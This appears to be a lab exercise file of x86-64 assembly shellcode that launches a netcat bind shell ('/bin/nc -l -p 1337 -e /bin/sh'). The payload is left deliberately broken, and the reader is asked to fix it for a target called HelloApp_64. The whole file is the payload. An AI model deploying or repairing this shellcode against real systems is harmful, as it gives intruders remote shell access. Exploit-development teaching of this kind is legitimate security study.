;;; This shellcode executes the following system call:
;;; sys_execve("/bin/nc", ["/bin/nc", "-l", "-p", "1337", "-e", "/bin/sh", null], [null])

;;; There is a small problem with this shellcode that will prevent it from
;;; working in HelloApp_64. Fixing the problem is relatively easy. Only one
;;; line needs to be modified, and one line needs to be added. Can you figure
;;; out which one?
	BITS 64

	;; arg3 = NULL
	xor    	rdx,rdx
	;;  0x636e2f6e69622fff = /bin/nc (padded with 0xfff)
	mov 	rdi,0x636e2f6e69622fff
	;; remove padding
	shr		rdi,0x08
	;; push /bin/nc
	push 	rdi
	;; syscall arg1 = address of "/bin/nc"
	mov 	rdi,rsp

	;; 0x68732f6e69622fff = "/bin/sh" (padded with 0xfff)
	mov		rcx,0x68732f6e69622fff
	;; remove padding
	shr		rcx,0x08
	;; push /bin/sh
	push 	rcx
	;; rcx = address of "/bin/sh"
	mov		rcx,rsp

	;; 0x652dffffffffffff = "-e" (padded)
	mov     rbx,0x652dffffffffffff
	;; remove padding
	shr		rbx,0x30	
	push	rbx
	;; rbx = address of "-e"
	mov		rbx,rsp

	;; 0x37333331ffffffff = "1337" (padded)
	mov		r10,0x37333331ffffffff
	;; remove padding
	shr 	r10,0x20
	push 	r10
	;; r10 = address of "1337"
	mov		r10,rsp

	;; 0x702dffffffffffff = "-p" (padded)
	mov		r9,0x702dffffffffffff
	shr		r9,0x30
	push 	r9
	;; r9 = address of "-p"
	mov		r9,rsp

	;; 0x6c2dffffffffffff = "-l" (padded)
	mov 	r8,0x6c2dffffffffffff
	shr		r8,0x30
	push 	r8
	;; r8 = address of "-l"
	mov		r8,rsp

	push	rdx  ;push NULL
	push 	rcx  ;push address of '/bin/sh'
	push	rbx  ;push address of '-e'
	push	r10  ;push address of '1337'
	push	r9   ;push address of '-p'
	push	r8   ;push address of '-l'
	push 	rdi  ;push address of '/bin/nc'

	;; set arg2
	mov    	rsi,rsp
	;; 59 = __NR_execve
	xor 	rax,rax
	mov    	al,59
	syscall
